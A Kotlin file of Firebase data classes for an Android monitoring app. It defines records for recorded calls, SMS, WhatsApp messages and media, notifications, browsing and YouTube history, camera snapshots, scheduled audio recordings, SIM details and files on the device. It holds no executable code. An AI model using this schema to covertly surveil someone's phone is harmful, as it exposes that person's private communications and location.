package com.example.authapp.data

import com.google.firebase.database.IgnoreExtraProperties

@IgnoreExtraProperties
data class CallLogItem(
    val id: String = "",
    val number: String = "",
    val name: String = "",
    val type: String = "INCOMING", // INCOMING, OUTGOING, MISSED, REJECTED
    val timestamp: Long = 0L,
    val durationSeconds: Long = 0L,
    val audioRecordingUrl: String = "",
    val location: String = ""
)

@IgnoreExtraProperties
data class NotificationItem(
    val id: String = "",
    val packageName: String = "",
    val appName: String = "",
    val title: String = "",
    val text: String = "",
    val timestamp: Long = 0L
)

@IgnoreExtraProperties
data class SecurityAlert(
    val id: String = "",
    val type: String = "", // BATTERY_LOW, SIM_CHANGED, KEYWORD_DETECTED
    val title: String = "",
    val message: String = "",
    val timestamp: Long = 0L,
    val severity: String = "WARNING" // INFO, WARNING, CRITICAL
)

@IgnoreExtraProperties
data class RecordingSchedule(
    val id: String = "",
    val hour: Int = 0,
    val minute: Int = 0,
    val durationMinutes: Int = 5,
    val isEnabled: Boolean = true,
    val repeatDaily: Boolean = true,
    val label: String = ""
)

@IgnoreExtraProperties
data class SnapshotInfo(
    val id: String = "",
    val downloadUrl: String = "",
    val timestamp: Long = 0L,
    val cameraFacing: String = "back"
)

@IgnoreExtraProperties
data class SmsItem(
    val id: String = "",
    val address: String = "",
    val body: String = "",
    val timestamp: Long = 0L,
    val type: String = "INCOMING" // INCOMING, OUTGOING
)

@IgnoreExtraProperties
data class GeofenceZone(
    val id: String = "",
    val name: String = "Home",
    val latitude: Double = 0.0,
    val longitude: Double = 0.0,
    val radiusMeters: Float = 200f,
    val isEnabled: Boolean = true
)

@IgnoreExtraProperties
data class MediaItemInfo(
    val id: String = "",
    val displayName: String = "",
    val mimeType: String = "",
    val sizeBytes: Long = 0L,
    val timestamp: Long = 0L,
    val folderName: String = ""
)

@IgnoreExtraProperties
data class WebHistoryItem(
    val id: String = "",
    val url: String = "",
    val title: String = "",
    val timestamp: Long = 0L,
    val isBlocked: Boolean = false
)

@IgnoreExtraProperties
data class NetworkHistoryItem(
    val id: String = "",
    val ssid: String = "",
    val networkType: String = "WIFI", // WIFI, MOBILE
    val connectedAt: Long = 0L,
    val disconnectedAt: Long = 0L,
    val ipAddress: String = ""
)

@IgnoreExtraProperties
data class SimCardInfo(
    val simSlot: Int = 0,
    val operatorName: String = "",
    val countryIso: String = "",
    val simSerialNumber: String = "",
    val simState: String = "READY",
    val lastUpdated: Long = 0L
)

@IgnoreExtraProperties
data class AppInstallEvent(
    val id: String = "",
    val packageName: String = "",
    val appName: String = "",
    val eventType: String = "INSTALLED", // INSTALLED, UNINSTALLED
    val timestamp: Long = 0L
)

@IgnoreExtraProperties
data class WhatsAppLogItem(
    val id: String = "",
    val senderName: String = "",
    val messageText: String = "",
    val timestamp: Long = 0L,
    val type: String = "CHAT", // CHAT, STATUS, AUDIO, PHOTO, VIDEO
    val isIncoming: Boolean = true,
    val mediaUrl: String = "",   // WhatsApp Status/Photo/Video download URL
    val mediaType: String = ""   // "image", "video", "audio" - empty if text-only
)

@IgnoreExtraProperties
data class YouTubeLogItem(
    val id: String = "",
    val videoTitle: String = "",
    val searchTerm: String = "",
    val channelName: String = "",
    val timestamp: Long = 0L,
    val type: String = "WATCHED" // SEARCH, WATCHED
)

@IgnoreExtraProperties
data class MediaGalleryItem(
    val id: String = "",
    val fileName: String = "",
    val filePath: String = "",
    val fileType: String = "IMAGE", // IMAGE, VIDEO
    val sizeBytes: Long = 0L,
    val dateAdded: Long = 0L
)

@IgnoreExtraProperties
data class FileExplorerItem(
    val path: String = "",
    val name: String = "",
    val isDirectory: Boolean = false,
    val sizeBytes: Long = 0L,
    val lastModified: Long = 0L,
    val parentPath: String = ""
)



